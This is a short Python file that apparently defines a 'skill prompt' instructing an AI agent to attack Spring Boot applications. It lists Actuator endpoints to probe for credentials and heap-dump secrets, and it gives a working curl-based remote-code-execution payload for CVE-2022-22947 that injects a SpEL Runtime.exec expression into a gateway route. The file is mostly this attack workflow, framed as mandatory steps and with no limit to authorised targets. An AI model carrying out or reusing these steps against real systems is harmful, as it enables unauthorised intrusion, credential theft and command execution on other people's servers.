"""
Spring Boot Attack Skill Prompt.
"""

SPRING_BOOT_SKILL_PROMPT = """
## ATTACK SKILL: SPRING BOOT ATTACKS

### MANDATORY WORKFLOW

#### STEP 1: ACTUATOR ENUMERATION
Spring Boot Actuator endpoints to probe:
```
/actuator, /actuator/env, /actuator/configprops, /actuator/beans
/actuator/heapdump, /actuator/threaddump, /actuator/mappings
/actuator/gateway/routes, /actuator/conditions
/actuator/env -> DATABASE_PASSWORD, SECRET_KEY, AWS_KEYS
/heapdump -> download and analyze with jhat/Eclipse MAT for creds
```

#### STEP 2: ENV/PROPERTIES EXPOSURE
If /actuator/env returns properties, look for: `spring.datasource.password`, `cloud.aws.credentials`, `management.endpoints.web.exposure.include`

#### STEP 3: GATEWAY RCE (CVE-2022-22947)
If Spring Cloud Gateway actuator is exposed:
```bash
curl -X POST /actuator/gateway/routes/hack -d '{"predicates":["Path=/hack"],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Cmd","value":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}}],"uri":"http://example.com"}'
curl -X POST /actuator/gateway/refresh
curl /actuator/gateway/routes/hack
```

#### ANTI-PATTERNS: Don't ignore /heapdump — it contains ALL in-memory secrets.
"""
